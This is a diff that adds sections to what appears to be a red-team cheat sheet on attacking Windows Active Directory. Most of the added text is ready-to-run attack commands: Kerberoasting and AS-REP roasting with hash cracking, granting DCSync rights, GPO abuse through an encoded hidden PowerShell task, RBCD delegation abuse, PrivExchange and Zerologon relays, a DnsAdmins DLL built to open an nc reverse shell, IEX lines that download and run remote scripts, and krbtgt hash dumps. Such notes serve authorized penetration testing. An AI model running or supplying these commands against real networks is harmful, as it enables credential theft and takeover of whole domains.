@@ -404,6 +404,45 @@ $ mount -t nfs 127.0.0.1:/home /mnt/nfs -v -o user=snovvcrash,[pass='Passw0rd!']
 
 
 
+# WSUS
+
+* [book.hacktricks.xyz/windows/windows-local-privilege-escalation#wsus](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#wsus)
+
+
+
+
+## WSUS HTTP (MitM)
+
+* [www.blackhat.com/docs/us-15/materials/us-15-Stone-WSUSpect-Compromising-Windows-Enterprise-Via-Windows-Update.pdf](https://www.blackhat.com/docs/us-15/materials/us-15-Stone-WSUSpect-Compromising-Windows-Enterprise-Via-Windows-Update.pdf)
+* [www.gosecure.net/blog/2020/09/03/wsus-attacks-part-1-introducing-pywsus/](https://www.gosecure.net/blog/2020/09/03/wsus-attacks-part-1-introducing-pywsus/)
+
+
+
+### Check
+
+```
+PS > reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
+
+HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
+      WUServer    REG_SZ    http://WSUS-SRV.megacorp.local:8530
+
+PS > reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer
+
+HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer
+      UseWUServer    REG_DWORD    0x1
+```
+
+
+
+
+## WSUS Local Proxy (LPE)
+
+* [www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
+
+
+
+
+
 # LDAP
 
 * [book.hacktricks.xyz/pentesting/pentesting-ldap](https://book.hacktricks.xyz/pentesting/pentesting-ldap)
@@ -522,6 +561,908 @@ $ nmap -p 139,445 --script=/usr/share/nmap/scripts/smb-os-discovery --script-arg
 
 
 
+## Roasting
+
+
+
+### ASREPRoasting
+
+Show domain users with `DONT_REQ_PREAUTH` flag set:
+
+```
+PowerView3 > Get-DomainUser -UACFilter DONT_REQ_PREAUTH
+```
+
+
+#### Normal
+
+##### GetNPUsers.py
+
+* [vbscrub.com/2020/02/22/impackets-getnpusers-script-explained/](https://vbscrub.com/2020/02/22/impackets-getnpusers-script-explained/)
+
+```
+$ GetNPUsers.py MEGACORP/ -dc-ip 127.0.0.1 -no-pass -usersfile /usr/share/seclists/Usernames/Names/names.txt -request -format hashcat -outputfile asprep.in | tee GetNPUsers.log
+$ cat GetNPUsers.log | grep -v 'Client not found in Kerberos database'
+$ ./hashcat64.exe -m 18200 -a 0 -w 4 -O --session=snovvcrash -o asprep.out asprep.in seclists/Passwords/darkc0de.txt -r rules/d3ad0ne.rule
+```
+
+
+#### Targeted
+
+* [github.com/HarmJ0y/ASREPRoast](https://github.com/HarmJ0y/ASREPRoast)
+* [github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#asreproast](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#asreproast)
+
+Given GenericWrite/GenericAll DACL rights over a target, we can modify most of the user’s attributes. We can change a victim’s userAccountControl to not require Kerberos preauthentication, grab the user’s crackable AS-REP, and then change the setting back. (@harmj0y, [ref](https://www.harmj0y.net/blog/activedirectory/targeted-kerberoasting/))
+
+```
+PowerView2 > Get-DomainUser snovvcrash | ConvertFrom-UACValue
+PowerView2 > Set-DomainObject -Identity snovvcrash -XOR @{useraccountcontrol=4194304} -Verbose
+PowerView2 > Get-DomainUser snovvcrash | ConvertFrom-UACValue
+ASREPRoast > Get-ASREPHash -Domain megacorp.local -UserName snovvcrash
+PowerView2 > Set-DomainObject -Identity snovvcrash -XOR @{useraccountcontrol=4194304} -Verbose
+PowerView2 > Get-DomainUser snovvcrash | ConvertFrom-UACValue
+```
+
+
+
+### Kerberoasting
+
+* [www.harmj0y.net/blog/redteaming/kerberoasting-revisited/](https://www.harmj0y.net/blog/redteaming/kerberoasting-revisited/)
+* [www.harmj0y.net/blog/redteaming/rubeus-now-with-more-kekeo/](http://www.harmj0y.net/blog/redteaming/rubeus-now-with-more-kekeo/)
+* [www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/](https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/)
+* [github.com/GhostPack/Rubeus#kerberoast](https://github.com/GhostPack/Rubeus#kerberoast)
+* [docs.microsoft.com/ru-ru/archive/blogs/openspecification/windows-configurations-for-kerberos-supported-encryption-type](https://docs.microsoft.com/ru-ru/archive/blogs/openspecification/windows-configurations-for-kerberos-supported-encryption-type)
+* [swarm.ptsecurity.com/kerberoasting-without-spns/](https://swarm.ptsecurity.com/kerberoasting-without-spns/)
+
+Check `msDS-SupportedEncryptionTypes` attribute (if RC4 is enabled):
+
+```
+PowerView3 > Get-DomainUser -Identity snovvcrash -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
+```
+
+
+#### Normal
+
+##### GetUserSPNs.py
+
+```
+$ GetUserSPNs.py MEGACORP/s.freeside:'Passw0rd!' -dc-ip 127.0.0.1 -save
+$ ./hashcat64.exe -m 13100 -a 0 -w 4 -O --session=snovvcrash -o tgsrep.out tgsrep.in seclists/Passwords/darkc0de.txt -r rules/d3ad0ne.rule
+```
+
+
+#### Targeted
+
+We can execute 'normal' Kerberoasting instead: given modification rights on a target, we can change the user’s serviceprincipalname to any SPN we want (even something fake), Kerberoast the service ticket, and then repair the serviceprincipalname value. (@harmj0y, [ref](https://www.harmj0y.net/blog/activedirectory/targeted-kerberoasting/))
+
+```
+PowerView2 > Get-DomainUser snovvcrash | Select serviceprincipalname
+PowerView2 > Set-DomainObject -Identity snovvcrash -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}
+PowerView2 > $User = Get-DomainUser snovvcrash 
+PowerView2 > $User | Get-DomainSPNTicket | fl
+PowerView2 > $User | Select serviceprincipalname
+PowerView2 > Set-DomainObject -Identity snovvcrash -Clear serviceprincipalname
+```
+
+
+
+
+## ACL Abuse
+
+* [www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
+* [blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
+
+
+
+### Hunt for ACLs
+
+
+#### PowerView2
+
+Search for interesting ACLs:
+
+```
+PowerView2 > Invoke-ACLScanner -ResolveGUIDs
+```
+
+Check if the attacker "MEGACORP\sbauer" has `GenericWrite` permissions on the "jorden" user object:
+
+```
+PowerView2 > Get-ObjectAcl -samAccountName jorden -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericWrite" -and $_.IdentityReference -eq "MEGACORP\sbauer"}
+
+InheritedObjectType   : All
+ObjectDN              : CN=Jorden Mclean,OU=Athens,OU=Employees,DC=MEGACORP,DC=LOCAL  <== Victim (jorden)
+ObjectType            : All
+IdentityReference     : MEGACORP\sbauer  <== Attacker (sbauer)
+IsInherited           : False
+ActiveDirectoryRights : GenericWrite
+PropagationFlags      : None
+ObjectFlags           : None
+InheritanceFlags      : ContainerInherit
+InheritanceType       : All
+AccessControlType     : Allow
+ObjectSID             : S-1-5-21-3167813660-1240564177-918740779-3110
+```
+
+
+#### PowerView3
+
+Search for interesting ACLs:
+
+```
+PowerView3 > Find-InterestingDomainAcl -ResolveGUIDs | ? {$_.IdentityReferenceClass -match "user"}
+
+AceType               : AccessAllowed
+ObjectDN              : CN=Jorden Mclean,OU=Athens,OU=Employees,DC=MEGACORP,DC=LOCAL
+ActiveDirectoryRights : GenericWrite
+OpaqueLength          : 0
+ObjectSID             : S-1-5-21-3167813660-1240564177-918740779-3110  <== Victim (jorden)
+InheritanceFlags      : ContainerInherit
+BinaryLength          : 36
+IsInherited           : False
+IsCallback            : False
+PropagationFlags      : None
+SecurityIdentifier    : S-1-5-21-3167813660-1240564177-918740779-3102  <== Attacker (sbauer)
+AccessMask            : 131112
+AuditFlags            : None
+AceFlags              : ContainerInherit
+AceQualifier          : AccessAllowed
+```
+
+Check if the attacker "MEGACORP\sbauer" (`S-1-5-21-3167813660-1240564177-918740779-3102`) has `GenericWrite` permissions on the "jorden" user object:
+
+```
+PowerView3 > Get-DomainObjectAcl -Identity jorden -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericWrite" -and $_.SecurityIdentifier -eq "S-1-5-21-3167813660-1240564177-918740779-3102"}
+```
+
+Note:
+
+* PowerView 3.0 does not return `IdentityReference` property, which makes it less handy for this task (however, you may filter the output by the attacker's SID).
+* `-ResolveGUIDs` switch shows `ObjectType` and `InheritedObjectType` properties in a human form (not in GUIDs).
+
+
+
+### Exchange Windows Permissions
+
+Privilege escalation with ACLs in AD by example of the `Exchange Windows Permissions` domain group.
+
+Add user to the `Exchange Windows Permissions` group:
+
+```
+PS > Add-ADGroupMember -Identity "Exchange Windows Permissions" -Members snovvcrash
+```
+
+Add DCSync rights with PowerView2:
+
+```
+PowerView2 > Add-ObjectAcl -TargetDistinguishedName "DC=megacorp,DC=local" -PrincipalName snovvcrash -Rights DCSync -Verbose
+```
+
+Add DCSync rights with PowerView3:
+
+```
+PS > $cred = New-Object System.Management.Automation.PSCredential("snovvcrash", $(ConvertTo-SecureString "Passw0rd!" -AsPlainText -Force))
+PowerView3 > Add-DomainObjectAcl -TargetIdentity "DC=megacorp,DC=local" -PrincipalIdentity snovvcrash -Credential $cred -Rights DCSync -Verbose
+```
+
+Add DCSync rights with ntlmrelayx.py:
+
+```
+$ sudo ntlmrelayx.py -t ldap://DC01.megacorp.local --escalate-user snovvcrash
+```
+
+Add DCSync rights with aclpwn.py:
+
+* [github.com/fox-it/aclpwn.py](https://github.com/fox-it/aclpwn.py)
+* [www.slideshare.net/DirkjanMollema/aclpwn-active-directory-acl-exploitation-with-bloodhound](https://www.slideshare.net/DirkjanMollema/aclpwn-active-directory-acl-exploitation-with-bloodhound)
+* [www.puckiestyle.nl/aclpwn-py/](https://www.puckiestyle.nl/aclpwn-py/)
+
+```
+$ aclpwn -f snovvcrash -ft user -t megacorp.local -tt domain -d megacorp.local -du neo4j -dp neo4j --server 127.0.0.1 -u snovvcrash -p 'Passw0rd!' -sp 'Passw0rd!'
+```
+
+Add DCSync rights with ActiveDirectory module:
+
+* [github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md](https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md)
+
+1. Получить ACL для корневого объекта (домен).
+2. Получить SID для аккаунта, которому нужно дать DCSync.
+3. Создать новый ACL и выставить в нем права "Replicating Directory Changes" (GUID `1131f6ad-...`) и "Replicating Directory Changes All" (GUID `1131f6aa-...`) для SID из п. 2.
+4. Применить изменения.
+
+```
+PS > Import-Module ActiveDirectory
+PS > $acl = Get-Acl "AD:DC=megacorp,DC=local"
+PS > $user = Get-ADUser snovvcrash
+PS > $sid = New-Object System.Security.Principal.SecurityIdentifier $user.SID
+PS > $objectGuid = New-Object guid 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
+PS > $identity = [System.Security.Principal.IdentityReference] $sid
+PS > $adRights = [System.DirectoryServices.ActiveDirectoryRights] "ExtendedRight"
+PS > $type = [System.Security.AccessControl.AccessControlType] "Allow"
+PS > $inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] "None"
+PS > $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $identity,$adRights,$type,$objectGuid,$inheritanceType
+PS > $acl.AddAccessRule($ace)
+PS > $objectGuid = New-Object Guid 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
+PS > $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $identity,$adRights,$type,$objectGuid,$inheritanceType
+PS > $acl.AddAccessRule($ace)
+PS > Set-Acl -AclObject $acl "AD:DC=megacorp,DC=local"
+```
+
+
+
+
+## GPO Abuse
+
+* [www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](https://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
+* [pentestmag.com/gpo-abuse-you-cant-see-me/](https://pentestmag.com/gpo-abuse-you-cant-see-me/)
+* [wald0.com/?p=179](https://wald0.com/?p=179)
+* [habr.com/ru/company/jetinfosystems/blog/449278/](https://habr.com/ru/company/jetinfosystems/blog/449278/)
+
+
+
+### Recon
+
+Show all GPOs in the domain:
+
+```
+PowerView3 > Get-NetGPO -Domain megacorp.local | select cn,displayname
+```
+
+Search for GPOs that are controlled by the "MEGACORP\PolicyAdmins" group:
+
+```
+PowerView3 > Get-NetGPO | % {Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "MEGACORP\PolicyAdmins"}
+```
+
+List computers that are affected by vulnerable (modifiable) GPO:
+
+```
+PowerView3 > Get-NetOU -GUID "00ff00ff-00ff-00ff-00ff-00ff00ff00ff" | % {Get-NetComputer -ADsPath $_}
+```
+
+Note: if I list all OUs affected by this GPO with PowerView, there will be no domain shown (like in BloodHound), but in Group Policy Manager we can see that it is presented.
+
+Check if computer settings are enabled for this GPO (and enable them if not):
+
+* [gist.github.com/snovvcrash/ecdc639b061fe787617d8d92d8549801](https://gist.github.com/snovvcrash/ecdc639b061fe787617d8d92d8549801)
+
+```
+PS > Get-Gpo VULN.GPO.NAME
+PS > Set-GpoStatus VULN.GPO.NAME -Status AllSettingsEnabled
+```
+
+
+
+### Exploit
+
+Create a task with a pwsh payload:
+
+```
+$ echo 'sc -path "c:\\windows\\temp\\poc.txt" -value "GPO Abuse PoC..."' | iconv -t UTF-16LE | base64 -w0; echo
+cwBjACAALQBwAGEAdABoACAAIgBjADoAXAB3AGkAbgBkAG8AdwBzAFwAdABlAG0AcABcAHAAbwBjAC4AdAB4AHQAIgAgAC0AdgBhAGwAdQBlACAAIgBHAFAATwAgAEEAYgB1AHMAZQAgAFAAbwBDAC4ALgAuACIACgA=
+PS > New-GPOImmediateTask -TaskName Pentest -GPODisplayName VULN.GPO.NAME -CommandArguments '-NoP -NonI -W Hidden -Enc cwBjACAALQBwAGEAdABoACAAIgBjADoAXAB3AGkAbgBkAG8AdwBzAFwAdABlAG0AcABcAHAAbwBjAC4AdAB4AHQAIgAgAC0AdgBhAGwAdQBlACAAIgBHAFAATwAgAEEAYgB1AHMAZQAgAFAAbwBDAC4ALgAuACIACgA=' -Force
+```
+
+Cleanup:
+
+```
+PS > New-GPOImmediateTask -GPODisplayName VULN.GPO.NAME -Remove -Force
+```
+
+Check when GP was last applied:
+
+```
+Cmd > GPRESULT /R
+```
+
+
+
+
+## Delegation Abuse
+
+* [www.thehacker.recipes/active-directory-domain-services/movement/abusing-kerberos/kerberos-delegations](https://www.thehacker.recipes/active-directory-domain-services/movement/abusing-kerberos/kerberos-delegations)
+
+
+
+### Unconstrained
+
+* [adsecurity.org/?p=1667](https://adsecurity.org/?p=1667)
+* [dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/](https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/)
+
+```
+PowerView3 > Get-DomainComputer -Unconstrained | select dnshostname,samaccountname,useraccountcontrol
+```
+
+
+### Resource-Based Constrained Delegation (RBCD)
+
+* [shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
+* [www.harmj0y.net/blog/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/](https://www.harmj0y.net/blog/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/)
+* [sensepost.com/blog/2020/chaining-multiple-techniques-and-tools-for-domain-takeover-using-rbcd/](https://sensepost.com/blog/2020/chaining-multiple-techniques-and-tools-for-domain-takeover-using-rbcd/)
+
+
+#### RBCD from Windows
+
+Load tools:
+
+```
+PS > IEX(New-Object Net.WebClient).DownloadString("http://10.14.14.37/powermad.ps1")
+PS > IEX(New-Object Net.WebClient).DownloadString("http://10.14.14.37/powerview4.ps1")
+```
+
+Check if `ms-DS-MachineAccountQuota` allows to create new machine accounts:
+
+```
+PS > $root = [ADSI]"LDAP://RootDSE"
+PS > $root.rootDomainNamingContext
+DC=megacorp,DC=local
+PowerView3 > Get-DomainObject -Identity "DC=megacorp,DC=local" | select ms-ds-machineaccountquota
+
+ms-ds-machineaccountquota
+-------------------------
+                       10
+```
+
+Define credentials for the compromised account with the necessary DACL:
+
+```
+PS > $userWithDaclUsername = 'megacorp.local\snovvcrash'
+PS > $userWithDaclPassword = ConvertTo-SecureString 'Qwe123!@#' -AsPlainText -Force
+PS > $cred = New-Object System.Management.Automation.PSCredential($userWithDaclUsername, $userWithDaclPassword)
+```
+
+Add new machine account and configure RBCD on the vulnerable host (DC01):
+
+```
+PS > New-MachineAccount -MachineAccount fakemachine1337 -Password $(ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force) -Verbose
+PowerView3 > $computerSID = Get-DomainComputer -Identity fakemachine1337 -Properties ObjectSid -Verbose -Credential $Cred | Select -Expand ObjectSid
+PS > $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($computerSID))"
+PS > $SDBytes = New-Object byte[] ($SD.BinaryLength)
+PS > $SD.GetBinaryForm($SDBytes, 0)
+PowerView3 > Get-DomainComputer DC01.megacorp.local -Verbose -Credential $cred | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$SDBytes} -Verbose -Credential $cred
+PS > .\Rubeus.exe hash /domain:megacorp.local /user:fakemachine1337 /password:Passw0rd!
+FC525C9683E8FE067095BA2DDC971889
+```
+
+Ask TGS for CIFT and HTTP:
+
+```
+PS > .\Rubeus.exe s4u /domain:megacorp.local /user:fakemachine1337 /rc4:FC525C9683E8FE067095BA2DDC971889 /impersonateuser:DC01$ /msdsspn:CIFS/DC01.megacorp.local /altservice:HTTP /ptt
+PS > klist
+PS > cd \\DC01.megacorp.local\c$
+PS > ls
+PS > cd c:\
+PS > Enter-PSSession -ComputerName DC01.megacorp.local
+PS > exit
+```
+
+Ask TGS for LDAP:
+
+```
+PS > .\Rubeus.exe s4u /domain:megacorp.local /user:fakemachine1337 /rc4:FC525C9683E8FE067095BA2DDC971889 /impersonateuser:DC01$ /msdsspn:LDAP/DC01.megacorp.local /ptt
+PS > klist
+PS > ...DCSync...
+```
+
+Cleanup:
+
+```
+PowerView3 > Get-DomainComputer DC01.megacorp.local -Verbose -Credential $Cred | Set-DomainObject -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity' -Verbose -Credential $Cred
+```
+
+##### PowerView 4.0
+
+Configure RBCD on the vulnerable host (DC01):
+
+```
+PowerView4 > Set-DomainRBCD DC01 -DelegateFrom fakemachine1337 -Verbose
+```
+
+Cleanup:
+
+```
+PowerView4 > Set-DomainRBCD DC01 -Clear -Verbose
+```
+
+
+#### RBCD from Linux
+
+Add new machine account:
+
+```
+$ addcomputer.py -computer-name 'fakemachine1337$' -computer-pass 'Passw0rd!' -dc-ip 10.10.13.37 -dc-host DC02.megacorp.local 'megacorp.local/snovvcrash:Qwe123!@#'
+```
+
+Configure RBCD on the vulnerable host:
+
+```
+...rbcd-attack...
+Or
+...rbcd_permissions...
+```
+
+Ask TGS for LDAP:
+
+```
+$ getST.py -spn ldap/DC01.megacorp.local -impersonate 'DC01$' -dc-ip 10.10.13.37 'megacorp.local/fakemachine1337$:Passw0rd!'
+$ ...DCSync...
+```
+
+##### rbcd-attack
+
+* [github.com/tothi/rbcd-attack](https://github.com/tothi/rbcd-attack)
+
+Configure RBCD on the vulnerable host (DC01):
+
+```
+$ ./rbcd.py -f fakemachine1337 -t DC01 -dc-ip 10.10.13.37 'megacorp.local/snovvcrash:Qwe123!@#'
+```
+
+##### rbcd_permissions
+
+* [github.com/NinjaStyle82/rbcd_permissions](https://github.com/NinjaStyle82/rbcd_permissions)
+
+Configure RBCD on the vulnerable host (DC01) via PtH:
+
+```
+$ ./rbcd.py -t 'CN=dc01,OU=Domain Controllers,DC=megacorp,DC=local' -d megacorp.local -c 'CN=fakemachine1337,CN=Computers,DC=megacorp,DC=local' -u snovvcrash -H 79bfd1ab35c67c19715aea7f06da66ee:79bfd1ab35c67c19715aea7f06da66ee -l 10.10.13.37
+```
+
+
+#### DHCPv6 + WPAD + NTLM Relay + RBCD
+
+* [dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/)
+* [chryzsh.github.io/relaying-delegation/](https://chryzsh.github.io/relaying-delegation/)
+* [habr.com/ru/company/jetinfosystems/blog/449278/](https://habr.com/ru/company/jetinfosystems/blog/449278/)
+* [www.exploit-db.com/docs/48282](https://www.exploit-db.com/docs/48282)
+
+```
+$ sudo /usr/local/bin/ntlmrelayx.py -t ldaps://DC01.megacorp.local --delegate-access --no-smb-server -wh attacker-wpad --no-da --no-acl --no-validate-privs
+$ sudo mitm6 -i eth0 -d megacorp.local --ignore-nofqdn
+```
+
+
+
+
+## User Hunt
+
+* [www.harmj0y.net/blog/penetesting/i-hunt-sysadmins/](http://www.harmj0y.net/blog/penetesting/i-hunt-sysadmins/)
+* [www.slideshare.net/harmj0y/i-hunt-sys-admins-20](https://www.slideshare.net/harmj0y/i-hunt-sys-admins-20)
+
+
+
+### Sessions Enum
+
+* [www.harmj0y.net/blog/powershell/powershell-and-win32-api-access/](http://www.harmj0y.net/blog/powershell/powershell-and-win32-api-access/)
+* [www.harmj0y.net/blog/powershell/powerquinsta/](http://www.harmj0y.net/blog/powershell/powerquinsta/)
+
+
+
+### Derivative Local Admins
+
+* [www.harmj0y.net/blog/redteaming/local-group-enumeration/](http://www.harmj0y.net/blog/redteaming/local-group-enumeration/)
+* [medium.com/@sixdub/derivative-local-admin-cdd09445aac8](https://medium.com/@sixdub/derivative-local-admin-cdd09445aac8)
+* [wald0.com/?p=14](https://wald0.com/?p=14)
+* [www.offensiveops.io/tools/bloodhound-working-with-results/](http://www.offensiveops.io/tools/bloodhound-working-with-results/)
+* [www.varonis.com/blog/powerview-for-penetration-testing/](https://www.varonis.com/blog/powerview-for-penetration-testing/)
+
+
+
+
+## PrivExchange
+
+**CVE-2019-0686, CVE-2019-0724**
+
+* [github.com/dirkjanm/PrivExchange](https://github.com/dirkjanm/PrivExchange)
+* [dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/)
+
+
+
+### Check
+
+* [twitter.com/\_wald0/status/1091062691383238656](https://twitter.com/_wald0/status/1091062691383238656)
+
+```
+$ sudo ./Responder.py -I eth0 -Av
+$ python privexchange.py -d MEGACORP -u snovvcrash -p 'Passw0rd!' -ah 10.10.13.37 -ap '/test/test/test' exch01.megacorp.local --debug
+```
+
+
+
+### Exploit
+
+```
+$ sudo ntlmrelayx.py -t ldap://DC01.megacorp.local --escalate-user snovvcrash
+$ python privexchange.py -d MEGACORP -u snovvcrash -p 'Passw0rd!' -ah 10.10.13.37 exch01.megacorp.local --debug
+```
+
+
+
+
+## Zerologon
+
+**CVE-2020-1472**
+
+* [www.secura.com/uploads/whitepapers/Zerologon.pdf](https://www.secura.com/uploads/whitepapers/Zerologon.pdf)
+* [twitter.com/\_dirkjan/status/1306280566313156608](https://twitter.com/_dirkjan/status/1306280566313156608)
+
+
+
+### Check
+
+* [github.com/SecuraBV/CVE-2020-1472](https://github.com/SecuraBV/CVE-2020-1472)
+
+```
+$ ./zerologon_tester.py DC01 10.10.13.38
+```
+
+
+
+### Exploit
+
+* [github.com/dirkjanm/CVE-2020-1472](https://github.com/dirkjanm/CVE-2020-1472)
+* [github.com/blackarrowsec/redteam-research/tree/master/CVE-2020-1472](https://github.com/blackarrowsec/redteam-research/tree/master/CVE-2020-1472)
+
+Exploits above **will break the domain!** Use this technique by @dirkjanm to abuse Zerologon safely:
+
+* [dirkjanm.io/a-different-way-of-abusing-zerologon/](https://dirkjanm.io/a-different-way-of-abusing-zerologon/)
+
+```
+$ sudo ntlmrelayx.py -t dcsync://DC01.megacorp.local -smb2support
+$ ./dementor.py -d megacorp.local -u snovvcrash -p 'Passw0rd!' 10.10.13.37 DC02.megacorp.local
+```
+
+
+
+
+## DnsAdmins
+
+* [medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83](https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83)
+* [www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
+* [ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise)
+* [adsecurity.org/?p=4064](https://adsecurity.org/?p=4064)
+
+
+
+### Exploit
+
+```
+$ msfvenom -p windows/x64/exec cmd='c:\users\snovvcrash\documents\nc.exe 127.0.0.1 1337 -e powershell' -f dll > inject.dll
+PS > dnscmd.exe <HOSTNAME> /Config /ServerLevelPluginDll c:\users\snovvcrash\desktop\i.dll
+PS > Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll
+PS > (sc.exe \\<HOSTNAME> stop dns) -and (sc.exe \\<HOSTNAME> start dns)
+```
+
+
+
+### Cleanup
+
+```
+PS > reg delete HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
+PS > (sc.exe \\<HOSTNAME> stop dns) -and (sc.exe \\<HOSTNAME> start dns)
+```
+
+
+
+
+## Azure
+
+
+
+### ADSync
+
+* [github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1)
+* [blog.xpnsec.com/azuread-connect-for-redteam/](https://blog.xpnsec.com/azuread-connect-for-redteam/)
+
+```
+PS > Azure-ADConnect -server 127.0.0.1 -db ADSync
+```
+
+
+
+
+## LAPS
+
+
+
+### Enabled?
+
+Check locally:
+
+```
+PS > gc "c:\program files\LAPS\CSE\Admpwd.dll"
+PS > Get-FileHash "c:\program files\LAPS\CSE\Admpwd.dll"
+PS > Get-AuthenticodeSignature "c:\program files\LAPS\CSE\Admpwd.dll"
+```
+
+Check in LDAP:
+
+```
+PowerView3 > Get-DomainObject "CN=ms-Mcs-AdmPwd,CN=Schema,CN=Configuration,DC=megacorp,DC=local"
+PowerView3 > Get-DomainObject "CN=ms-Mcs-AdmPwdExpirationTime,CN=Schema,CN=Configuration,DC=megacorp,DC=local"
+```
+
+
+
+
+## DCSync
+
+
+
+### Mimikatz
+
+```
+mimikatz # lsadump::dcsync /domain:megacorp.local /user:MEGACORP\krbtgt
+mimikatz # lsadump::dcsync /domain:megacorp.local /user:krbtgt@megacorp.local
+```
+
+
+
+### Invoke-DCSync.ps1
+
+* [github.com/BC-SECURITY/Empire/blob/master/data/module_source/credentials/Invoke-DCSync.ps1](https://github.com/BC-SECURITY/Empire/blob/master/data/module_source/credentials/Invoke-DCSync.ps1)
+
+```
+PS > Invoke-DCSync -GetComputers -Domain megacorp.local -DomainController DC01.megacorp.local
+```
+
+
+
+### secretsdump.py
+
+```
+$ secretsdump.py MEGACORP/snovvcrash:'Passw0rd!'@DC01.megacorp.local -dc-ip 10.10.13.37 -just-dc-user 'MEGACORP\krbtgt'
+$ secretsdump.py DC01.megacorp.local -dc-ip 10.10.13.37 -just-dc-user 'MEGACORP\krbtgt' -k -no-pass
+```
+
+
+## Attack Trusts
+
+* [www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
+* [www.harmj0y.net/blog/redteaming/domain-trusts-were-not-done-yet/](http://www.harmj0y.net/blog/redteaming/domain-trusts-were-not-done-yet/)
+* [www.harmj0y.net/blog/redteaming/domain-trusts-why-you-should-care/](http://www.harmj0y.net/blog/redteaming/domain-trusts-why-you-should-care/)
+* [habr.com/ru/company/jetinfosystems/blog/466445/](https://habr.com/ru/company/jetinfosystems/blog/466445/)
+
+Enum foreign users and groups:
+
+```
+PowerView3 > Get-DomainTrust -Domain megacorp.com
+PowerView3 > Get-DomainForeignGroupMember -Domain megacorp.com
+PowerView3 > Get-DomainForeignUser -Domain megacorp.com
+```
+
+
+
+### sIDHistory/ExtraSids Hopping
+
+* [www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/](http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/)
+* [www.harmj0y.net/blog/redteaming/the-trustpocalypse/](http://www.harmj0y.net/blog/redteaming/the-trustpocalypse/)
+
+Use PowerView to enumerate domain trusts:
+
+```
+PowerView2 > Get-NetForestDomain
+
+Forest                  : megacorp.local
+DomainControllers       : {DC03.megacorp.local, DC04.megacorp.local}
+Children                : {child.megacorp.local}
+DomainMode              : Windows2012R2Domain
+DomainModeLevel         : 6
+Parent                  :
+PdcRoleOwner            : DC03.megacorp.local
+RidRoleOwner            : DC03.megacorp.local
+InfrastructureRoleOwner : DC03.megacorp.local
+Name                    : megacorp.local
+
+Forest                  : megacorp.local
+DomainControllers       : {DC01.child.megacorp.local, DC02.child.megacorp.local}
+Children                : {}
+DomainMode              : Windows2012R2Domain
+DomainModeLevel         : 6
+Parent                  : megacorp.local
